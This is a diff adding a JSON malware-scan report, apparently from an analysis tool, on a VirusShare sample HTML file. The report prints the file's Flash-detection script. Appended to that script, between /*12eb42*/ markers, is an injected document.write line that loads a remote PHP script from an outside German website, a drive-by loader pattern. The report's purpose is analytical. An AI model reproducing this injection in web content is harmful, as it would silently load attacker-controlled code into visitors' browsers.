@@ -1,0 +1,71 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "CreateObject": "May create an OLE object",
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "write": "May write to a file"
+        },
+        "macro": "var MM_contentVersion = 7;\n\nvar plugin = (navigator.mimeTypes && navigator.mimeTypes[\"application/x-shockwave-flash\"]) ? navigator.mimeTypes[\"application/x-shockwave-flash\"].enabledPlugin : 0;\nif (plugin) {\n\t\tvar words = navigator.plugins[\"Shockwave Flash\"].description.split(\" \");\n\t\tfor (var i = 0; i < words.length; ++i)\n\t\t{\n\t\tif (isNaN(parseInt(words[i])))\n\t\tcontinue;\n\t\tvar MM_PluginVersion = words[i]; \n\t\t}\n\tvar MM_FlashCanPlay = MM_PluginVersion >= MM_contentVersion;\n}\nelse if (navigator.userAgent && navigator.userAgent.indexOf(\"MSIE\")>=0 \n   && (navigator.appVersion.indexOf(\"Win\") != -1)) {\n\tdocument.write('<SCR' + 'IPT LANGUAGE=VBScript\\>\\n'); //FS hide this from IE4.5 Mac by splitting the tag\n\tdocument.write('on error resume next\\n');\n\tdocument.write('MM_FlashCanPlay = (IsObject(CreateObject(\"ShockwaveFlash.ShockwaveFlash.\" & MM_contentVersion)))\\n');\n\tdocument.write('</SCR' + 'IPT\\>\\n');\n}\nif (MM_FlashCanPlay) {\n\tdocument.write('<OBJECT classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\"');\n\tdocument.write(' codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,0,0\" ');\n\tdocument.write(' ID=\"header\" WIDTH=\"'+width+'\" HEIGHT=\"'+height+'\" ALIGN=\"\">');\n\tdocument.write(' <PARAM NAME=movie VALUE=\"' + movie + '\"> <PARAM NAME=quality VALUE=high><PARAM NAME=wmode value=transparent> <PARAM NAME=bgcolor VALUE=#000000> '); \n\tdocument.write(' <EMBED src=\"' + movie + '\" quality=\"high\" bgcolor=\"#000000\" wmode=\"transparent\"');\n\tdocument.write(' swLiveConnect=\"FALSE\" WIDTH=\"'+width+'\" HEIGHT=\"'+height+'\" NAME=\"header\" ALIGN=\"\"');\n\tdocument.write(' TYPE=\"application/x-shockwave-flash\" PLUGINSPAGE=\"http://www.macromedia.com/go/getflashplayer\">');\n\tdocument.write(' </EMBED>');\n\tdocument.write(' </OBJECT>');\n} else{\n\tdocument.write('<a href=\"http://www.macromedia.com/go/getflash/\">Flash installieren</a>');\n}\n\n/*12eb42*/\ndocument.write(\"<script src='http://quadfreunde-nordeifel.de/kalender/wHXy6DBL.php?id=111589339' type='text/javascript'></\" + \"script>\");\n/*/12eb42*/"
+    },
+    "filename": "VirusShare_99229ec11fa3548c367c54c0efc192b1",
+    "filesize": 2025,
+    "filetype": "HTML document, ASCII text",
+    "hashes": {
+        "md5": "99229ec11fa3548c367c54c0efc192b1",
+        "sha1": "dabadee16e149b76a51f1f59dc0a20de4c5891da",
+        "sha256": "8bd7dafa170ee434ff068891b4830c51944ad2eb8ef73a43b9b5b49cbd7406e4"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "var MM_contentVersion = 7;",
+            "var plugin = (navigator.mimeTypes && navigator.mimeTypes[\"application/x-shockwave-flash\"]) ? navigator.mimeTypes[\"application/x-shockwave-flash\"].enabledPlugin : 0;",
+            "if (plugin) {",
+            "\t\tvar words = navigator.plugins[\"Shockwave Flash\"].description.split(\" \");",
+            "\t\tfor (var i = 0; i < words.length; ++i)",
+            "\t\tif (isNaN(parseInt(words[i])))",
+            "\t\tcontinue;",
+            "\t\tvar MM_PluginVersion = words[i]; ",
+            "\tvar MM_FlashCanPlay = MM_PluginVersion >= MM_contentVersion;",
+            "else if (navigator.userAgent && navigator.userAgent.indexOf(\"MSIE\")>=0 ",
+            "   && (navigator.appVersion.indexOf(\"Win\") != -1)) {",
+            "\tdocument.write('<SCR' + 'IPT LANGUAGE=VBScript\\>\\n'); //FS hide this from IE4.5 Mac by splitting the tag",
+            "\tdocument.write('on error resume next\\n');",
+            "\tdocument.write('MM_FlashCanPlay = (IsObject(CreateObject(\"ShockwaveFlash.ShockwaveFlash.\" & MM_contentVersion)))\\n');",
+            "\tdocument.write('</SCR' + 'IPT\\>\\n');",
+            "if (MM_FlashCanPlay) {",
+            "\tdocument.write('<OBJECT classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\"');",
+            "\tdocument.write(' codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,0,0\" ');",
+            "\tdocument.write(' ID=\"header\" WIDTH=\"'+width+'\" HEIGHT=\"'+height+'\" ALIGN=\"\">');",
+            "\tdocument.write(' <PARAM NAME=movie VALUE=\"' + movie + '\"> <PARAM NAME=quality VALUE=high><PARAM NAME=wmode value=transparent> <PARAM NAME=bgcolor VALUE=#000000> '); ",
+            "\tdocument.write(' <EMBED src=\"' + movie + '\" quality=\"high\" bgcolor=\"#000000\" wmode=\"transparent\"');",
+            "\tdocument.write(' swLiveConnect=\"FALSE\" WIDTH=\"'+width+'\" HEIGHT=\"'+height+'\" NAME=\"header\" ALIGN=\"\"');",
+            "\tdocument.write(' TYPE=\"application/x-shockwave-flash\" PLUGINSPAGE=\"http://www.macromedia.com/go/getflashplayer\">');",
+            "\tdocument.write(' </EMBED>');",
+            "\tdocument.write(' </OBJECT>');",
+            "} else{",
+            "\tdocument.write('<a href=\"http://www.macromedia.com/go/getflash/\">Flash installieren</a>');",
+            "/*12eb42*/",
+            "document.write(\"<script src='http://quadfreunde-nordeifel.de/kalender/wHXy6DBL.php?id=111589339' type='text/javascript'></\" + \"script>\");",
+            "/*/12eb42*/"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://www.macromedia.com/go/getflashplayer",
+            "http://www.macromedia.com/go/getflash/",
+            "http://quadfreunde-nordeifel.de/kalender/wHXy6DBL.php?id=111589339",
+            "http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6000"
+        ]
+    },
+    "time": "0:00:00.289901",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
